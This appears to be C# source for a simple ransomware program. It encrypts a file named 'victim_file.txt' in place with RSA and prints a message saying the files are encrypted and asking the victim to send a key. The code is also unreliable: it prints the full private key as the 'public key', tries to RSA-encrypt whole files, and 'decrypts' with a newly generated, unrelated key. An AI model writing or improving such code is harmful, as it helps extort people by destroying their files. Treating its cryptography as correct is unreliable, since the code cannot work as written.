// EncryptionModule.cs
using System;
using System.Security.Cryptography;

namespace EncryptionModule
{
    public class Encryption
    {
        public static byte[] Encrypt(byte[] data, string publicKey)
        {
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                rsa.FromXmlString(publicKey);
                return rsa.Encrypt(data, false);
            }
        }
    }
}

// DecryptionModule.cs
using System;
using System.Security.Cryptography;

namespace DecryptionModule
{
    public class Decryption
    {
        public static byte[] Decrypt(byte[] encryptedData, string privateKey)
        {
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                rsa.FromXmlString(privateKey);
                return rsa.Decrypt(encryptedData, false);
            }
        }
    }
}

// KeyGenerator.cs
using System;
using System.Security.Cryptography;

namespace KeyGenerator
{
    public class KeyPair
    {
        public static string GenerateKeys()
        {
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                return rsa.ToXmlString(true);
            }
        }
    }
}

// FileEncryptor.cs
using System;
using System.IO;

namespace FileEncryptor
{
    public class Encryptor
    {
        public static void EncryptFile(string filePath, string publicKey)
        {
            byte[] data = File.ReadAllBytes(filePath);
            byte[] encryptedData = EncryptionModule.Encryption.Encrypt(data, publicKey);
            File.WriteAllBytes(filePath, encryptedData);
        }
    }
}

// FileDecryptor.cs
using System;
using System.IO;

namespace FileDecryptor
{
    public class Decryptor
    {
        public static void DecryptFile(string filePath, string privateKey)
        {
            byte[] encryptedData = File.ReadAllBytes(filePath);
            byte[] decryptedData = DecryptionModule.Decryption.Decrypt(encryptedData, privateKey);
            File.WriteAllBytes(filePath, decryptedData);
        }
    }
}

// MainProgram.cs
using System;

namespace MainProgram
{
    class Program
    {
        static void Main(string[] args)
        {
            string publicKey = KeyGenerator.KeyPair.GenerateKeys();
            string filePath = "victim_file.txt";

            FileEncryptor.Encryptor.EncryptFile(filePath, publicKey);

            Console.WriteLine("Your files have been encrypted!");
            Console.WriteLine("Send me the following public key to decrypt your files:");
            Console.WriteLine(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(publicKey)));

            Console.WriteLine("Press Enter to decrypt your files...");
            Console.ReadLine();

            string privateKey = KeyGenerator.KeyPair.GenerateKeys();
            FileDecryptor.Decryptor.DecryptFile(filePath, privateKey);

            Console.WriteLine("Your files have been decrypted!");
        }
    }
}